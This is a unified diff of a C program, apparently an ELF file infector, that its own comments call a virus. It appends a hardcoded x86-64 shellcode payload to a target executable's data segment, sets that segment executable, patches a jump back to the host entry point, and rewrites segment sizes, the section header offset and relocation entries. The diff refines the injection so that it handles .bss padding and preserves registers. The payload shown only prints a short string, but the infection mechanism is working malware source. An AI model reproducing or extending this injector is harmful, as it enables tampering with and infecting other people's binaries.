@@ -6,14 +6,18 @@
 #include <stdio.h>
 #include <string.h>
 
-char code2[40] = {
-	0x52,0x48,0xb8,0x48,0x61,0x43,0x6b,0x65,0x44,0x0a,
-	0x03,0x50,0x48,0x8d,0x34,0x24,0xb8,0x01,0x00,0x00,
-	0x00,0xbf,0x01,0x00,0x00,0x00,0xba,0x07,0x00,0x00,
-	0x00,0x0f,0x05,0x58,0x5a,0xe9
+char code2[88] = {
+	0x90,0x90,0x90,0x90,0x90,0x90,0x50,0x53,0x51,0x52,0x56,0x57,0x41,0x50,0x41,0x51,
+	0x41,0x52,0x41,0x53,0x41,0x54,0x41,0x55,0x41,0x56,
+	0x41,0x57,0x48,0xb8,0x48,0x61,0x43,0x6b,0x65,0x44,
+	0x0a,0x03,0x50,0x48,0x8d,0x34,0x24,0xb8,0x01,0x00,
+	0x00,0x00,0xbf,0x01,0x00,0x00,0x00,0xba,0x07,0x00,
+	0x00,0x00,0x0f,0x05,0x58,0x41,0x5f,0x41,0x5e,0x41,
+	0x5d,0x41,0x5c,0x41,0x5b,0x41,0x5a,0x41,0x59,0x41,
+	0x58,0x5f,0x5e,0x5a,0x59,0x5b,0x58,0xe9
 };
 
-int codeLen = 36;
+int codeLen = 88;
 
 void	debug_code() {
 	int i = 0;
@@ -38,8 +42,6 @@ int		main(int argc, char **argv) {
 	Elf64_Sym  *Sthdr = NULL;
 	Elf64_Rela *Rhdr = NULL;
 
-	codeLen += 4; // FOR ADDR LATER
-
 	// ENTRY HEADER
 	read(fd, buffer, sizeof(Elf64_Ehdr));
 	Ehdr = (Elf64_Ehdr *)buffer;
@@ -50,11 +52,6 @@ int		main(int argc, char **argv) {
 	uint64_t shdr_start = Ehdr->e_shoff;
 	uint16_t shnum = Ehdr->e_shnum;
 	uint64_t host_entry = Ehdr->e_entry;
-
-	// INCREMENT SECTION OFFSET BY CODE LEN
-	Ehdr->e_shoff += codeLen;
-	lseek(fd, 0x28, SEEK_SET);
-	write(fd, &Ehdr->e_shoff, sizeof(uint32_t));
 
 	// PARSE SEGMENTS
 	off_t phdr_start = lseek(fd, Ehdr->e_phoff, SEEK_SET);
@@ -84,7 +81,7 @@ int		main(int argc, char **argv) {
 		if (Phdr->p_type == 1 && Phdr->p_flags == 6) {
 			// printf("Found data segment at offset: 0x%lx\n", Phdr->p_offset);
 			injected_address = Phdr->p_offset + Phdr->p_filesz;
-			tmp = Phdr->p_vaddr + Phdr->p_filesz;
+			tmp = Phdr->p_vaddr + Phdr->p_memsz;
 			// printf("End of data segment: 0x%lx\n", injected_address);
 
 			// SET EXECUTE FLAG FOR DATA SEG
@@ -107,9 +104,10 @@ int		main(int argc, char **argv) {
 			difference *= -1; // FOR NEGATIVE REL JUMP
 			*(uint32_t *)addr = difference;
 			debug_code();
+			int bss_len = Phdr->p_memsz - Phdr->p_filesz;
 
 			// INCREASE DATA SEG SIZE, MEMSZ & FILESZ BY SIZE OF OUR VIRUS
-			Phdr->p_filesz += codeLen;
+			Phdr->p_filesz += codeLen + bss_len;
 			Phdr->p_memsz += codeLen;
 			lseek(fd, flag_offset + 4 + 8 + 8 + 8, SEEK_SET);
 			write(fd, &Phdr->p_filesz, sizeof(uint64_t));
@@ -117,17 +115,27 @@ int		main(int argc, char **argv) {
 
 			// APPEND CODE AT END DATA SEGMENT
 			lseek(fd, injected_address, SEEK_SET);
-			int j = 0;
+			int j = 0 - bss_len;
 			int end = read(fd, &buffer2, 8192);
 			// debug_code();
 			lseek(fd, injected_address, SEEK_SET);
+			printf("J:%d\n", j);
 			while (j < codeLen) {
-				write(fd, &code2[j], 1);
+				if (j < 0)
+					write(fd, "\0", 1);
+				else
+					write(fd, &code2[j], 1);
 				j++;
 			}
 			write(fd, buffer2, end);
-			printf("Injected %d hex values at offset: 0x%lx\n", j, injected_address);
+			printf("Injected %d hex values at offset: 0x%lx\n", j + bss_len, injected_address);
 			printf("Writing %d bytes to reach EOF\n", end);
+			// INCREMENT SECTION OFFSET BY CODE LEN
+			codeLen += Phdr->p_memsz - Phdr->p_filesz;
+			int tmp2 = shdr_start;
+			tmp2 += codeLen;
+			lseek(fd, 0x28, SEEK_SET);
+			write(fd, &tmp2, sizeof(uint32_t));
 		}
 		i++;
 	}
@@ -143,8 +151,8 @@ int		main(int argc, char **argv) {
 	while (i < shnum) {
 		Shdr = (Elf64_Shdr *)buffer + i;
 		shdr_offset = shdr_start + ((uint64_t)Shdr - (uint64_t)&buffer);
-		printf("Found section number: %d at file offset: 0x%lx\n", i, Shdr->sh_offset);
-		printf("Type: %d\n", Shdr->sh_type);
+		// printf("Found section number: %d at file offset: 0x%lx\n", i, Shdr->sh_offset);
+		// printf("Type: %d\n", Shdr->sh_type);
 		if (Shdr->sh_type == SHT_DYNSYM) {
 			printf("Found .dynsym section\n");
 			lseek(fd, Shdr->sh_offset, SEEK_SET);
@@ -174,9 +182,13 @@ int		main(int argc, char **argv) {
 				Rhdr_offset = Shdr->sh_offset + j * sizeof(Elf64_Rela);
 				if (Rhdr->r_offset >= tmp) {
 					printf("r_offset: %x\n", Rhdr->r_offset);
+					printf("r_info: %x\n", Rhdr->r_info);
+					printf("r_addend: %x\n", Rhdr->r_addend);
 					Rhdr->r_offset += codeLen;
 					lseek(fd, Rhdr_offset, SEEK_SET);
 					write(fd, &Rhdr->r_offset, sizeof(uint64_t));
+					//write(fd, &Rhdr->r_info, sizeof(Elf64_Xword));
+					//write(fd, &Rhdr->r_addend, sizeof(Elf64_Sxword));
 				}
 				j++;
 			}
@@ -185,13 +197,13 @@ int		main(int argc, char **argv) {
 			printf("Found .bss section\n");
 			found = 1;
 			// MUST CHANGE .data sh_flag to WAX ? (set bit SHF_EXECINSTR to 1) USELESS ?
-			Shdr = (Elf64_Shdr *)buffer + (i - 1);
-			Shdr->sh_size += codeLen;
-			//Shdr->sh_flags = Shdr->sh_flags | SHF_EXECINSTR; // SETTING EXEC BIT<]
-			uint64_t temp = shdr_start + ((uint64_t)Shdr - (uint64_t)&buffer);
-			lseek(fd, temp + 4 + 4 + 8 + 8 + 8, SEEK_SET);
-			write(fd, &Shdr->sh_size, sizeof(uint64_t));
-			Shdr = (Elf64_Shdr *)buffer + i;
+			// Shdr = (Elf64_Shdr *)buffer + (i - 1);
+			// Shdr->sh_size += codeLen;
+			// Shdr->sh_flags = Shdr->sh_flags | SHF_EXECINSTR; // SETTING EXEC BIT<]
+			// uint64_t temp = shdr_start + ((uint64_t)Shdr - (uint64_t)&buffer);
+			// lseek(fd, temp + 4 + 4 + 8 + 8 + 8, SEEK_SET);
+			// write(fd, &Shdr->sh_size, sizeof(uint64_t));
+			// Shdr = (Elf64_Shdr *)buffer + i;
 		}
 		// printf("Section check %lx > %lx\n", Shdr->sh_addr, tmp);
 		if (found) {
